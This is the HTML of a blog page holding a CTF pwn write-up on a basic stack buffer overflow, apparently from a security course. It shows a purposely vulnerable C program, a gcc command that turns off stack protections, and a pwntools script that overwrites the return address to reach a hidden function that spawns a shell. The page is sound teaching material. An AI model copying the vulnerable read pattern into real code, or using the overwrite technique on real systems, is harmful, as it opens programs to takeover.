<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content='
  Simple Buffer Overflow - 0x01
  #


  tags: CTF PWN
  #

Follow the concept of lecture 0x00

  Original Code
  #

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void y0u_c4n7_533_m3()
{
    execve("/bin/sh", (char *[]){0}, (char *[]){0});
}

int main()
{
    char buf[16];
    puts("This is your first bof challenge ;)");
    fflush(stdout);
    read(0, buf, 0x30);
    system("pause");
    return 0;
}
The secret function is aim to create a shell, therefore, our main purpose is try to get the shell by using buffer overflow.
We can check bof in the main function that it read the string with length 0x30 that bigger than buf size.'><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-buffer-overflow---0x01/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="Simple Buffer Overflow - 0x01"><meta property="og:description" content='Simple Buffer Overflow - 0x01 # tags: CTF PWN # Follow the concept of lecture 0x00
Original Code # #include <stdio.h> #include <stdlib.h> #include <unistd.h> void y0u_c4n7_533_m3() { execve("/bin/sh", (char *[]){0}, (char *[]){0}); } int main() { char buf[16]; puts("This is your first bof challenge ;)"); fflush(stdout); read(0, buf, 0x30); system("pause"); return 0; } The secret function is aim to create a shell, therefore, our main purpose is try to get the shell by using buffer overflow. We can check bof in the main function that it read the string with length 0x30 that bigger than buf size.'><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="security"><meta property="article:tag" content="CTF"><meta property="article:tag" content="PWN"><meta property="article:tag" content="NTUSTISC"><title>Simple Buffer Overflow - 0x01 | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-buffer-overflow---0x01/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>Simple Buffer Overflow - 0x01</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><ul><li></li></ul></li><li><a href=#original-code>Original Code</a></li><li><a href=#exploit>Exploit</a></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=simple-buffer-overflow---0x01>Simple Buffer Overflow - 0x01
<a class=anchor href=#simple-buffer-overflow---0x01>#</a></h1><h6 id=tags-ctf-pwn>tags: <code>CTF</code> <code>PWN</code>
<a class=anchor href=#tags-ctf-pwn>#</a></h6><p>Follow the concept of lecture <a href=https://hackmd.io/@UHzVfhAITliOM3mFSo6mfA/SJAt7Pd5s>0x00</a></p><h2 id=original-code>Original Code
<a class=anchor href=#original-code>#</a></h2><pre tabindex=0><code class=language-cpp! data-lang=cpp!>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;

void y0u_c4n7_533_m3()
{
    execve(&#34;/bin/sh&#34;, (char *[]){0}, (char *[]){0});
}

int main()
{
    char buf[16];
    puts(&#34;This is your first bof challenge ;)&#34;);
    fflush(stdout);
    read(0, buf, 0x30);
    system(&#34;pause&#34;);
    return 0;
}
</code></pre><p>The secret function is aim to create a shell, therefore, our main purpose is try to get the shell by using buffer overflow.
We can check <code>bof</code> in the main function that it read the string with length <code>0x30</code> that bigger than <code>buf</code> size.</p><ul><li>Note that, if you establish the code yourself, you must turn off the protection by the command below and use <code>checksec</code> to observe the protection<pre tabindex=0><code class=language-bash! data-lang=bash!>gcc -o bof3 bof3.c -zexecstack -no-pie -fno-stack-protector -z norelro
</code></pre><img src=https://imgur.com/ehuCWTI.png alt><ul><li>Reference
<a href=https://github.com/jwang-a/CTF/blob/master/TIPS/pwn_resource>pwn_resource</a></li></ul></li></ul><h2 id=exploit>Exploit
<a class=anchor href=#exploit>#</a></h2><ol><li>Tried to get the address of <code>y0u_c4n7_533_m3()</code> by using <code>objdump -d -M intel bof</code>. â†’ <code>0x4011b6</code>
<img src=https://imgur.com/mlaNNCT.png alt></li><li>Then we can construct the payload as below:<pre tabindex=0><code class=language-python! data-lang=python!>from pwn import *
r = process(&#39;./bof&#39;)
magic_addr = 0x4011b6
payload = b&#39;a&#39;*0x18 + p64(magic_addr)
r.recvuntil(&#39;;)\n&#39;)
r.send(payload)
r.interactive()
</code></pre></li><li>Then we get shell!!!
<img src=https://imgur.com/Tug5Uii.png alt></li></ol></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><ul><li></li></ul></li><li><a href=#original-code>Original Code</a></li><li><a href=#exploit>Exploit</a></li></ul></nav></div></aside></main></body></html>